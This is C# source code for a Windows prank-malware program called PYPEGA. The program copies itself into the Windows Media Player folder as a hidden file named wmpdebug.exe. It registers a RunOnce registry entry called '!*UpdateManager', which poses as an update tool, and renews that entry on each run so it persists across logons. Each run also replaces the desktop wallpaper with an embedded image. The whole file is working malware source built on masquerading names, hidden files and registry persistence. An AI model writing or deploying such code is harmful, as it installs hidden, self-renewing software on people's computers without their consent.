using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace PYPEGA
{
    class Pypega
    {

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int SystemParametersInfo(
                        int uAction, int uParam,
                        string lpvParam, int fuWinIni);
        public const int SPI_SETDESKWALLPAPER = 20;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDWININICHANGE = 0x02;


        static void GetPeped()
        {
            RegistryKey cu = Registry.CurrentUser;
            RegistryKey reg = cu.OpenSubKey(@"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true);
            reg.SetValue("!*UpdateManager", Application.ExecutablePath.Replace('/', '\\') + " /d");
        }

        static void SaveTemp(string path)
        {
            //Console.WriteLine('b');
            Bitmap pepe = new Bitmap(Properties.Resources.pepe);
            pepe.Save(path, ImageFormat.Bmp);
            Thread.Sleep(2500);
        }

        static void Main(string[] args)
        {
            if (args.Length != 0)
            {
                //Console.WriteLine('a');
                //File.Create("D:/PEPEGANG");
                GetPeped();
                var path = "C:/temp.bmp";
                SaveTemp(path);
                Console.WriteLine(SystemParametersInfo(SPI_SETDESKWALLPAPER, 1, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE));
                File.Delete(path);
                
            }
            else
            {
                if (File.Exists(@"C:\Program Files\Windows Media Player\wmpdebug.exe"))
                {
                    File.Delete(@"C:\Program Files\Windows Media Player\wmpdebug.exe");
                }
                File.Copy(Application.ExecutablePath.Replace('/', '\\'), @"C:\Program Files\Windows Media Player\wmpdebug.exe");
                File.SetAttributes(@"C:\Program Files\Windows Media Player\wmpdebug.exe", File.GetAttributes(@"C:\Program Files\Windows Media Player\wmpdebug.exe") | FileAttributes.Hidden);
                Process pypega = new Process();
                //pypega.StartInfo.FileName = @"C:\Program Files\Windows Media Player\wmpdebug.exe";
                //pypega.StartInfo.Arguments = " /d";
                //pypega.Start();
                RegistryKey cu = Registry.CurrentUser;
                RegistryKey reg = cu.OpenSubKey(@"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true);
                reg.SetValue("!*UpdateManager", @"C:\Program Files\Windows Media Player\wmpdebug.exe /d");
            }
            
        }
    }
}
